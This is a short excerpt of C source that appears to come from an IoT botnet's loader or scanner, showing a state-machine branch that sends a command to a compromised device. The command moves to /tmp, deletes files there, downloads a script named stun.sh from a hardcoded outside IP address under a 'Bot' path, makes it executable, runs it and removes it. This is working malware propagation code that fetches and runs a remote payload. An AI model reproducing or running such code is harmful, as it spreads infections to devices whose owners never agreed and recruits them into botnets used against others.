        ...
        while(1)
        {
			...
			case 8:
				...
				break;
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "cd /tmp; rm *; wget http://208.67.1.157/Bot/stun.sh ; chmod +x stun.sh ; sh stun.sh ; rm -f stun.sh\r\n", 101, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
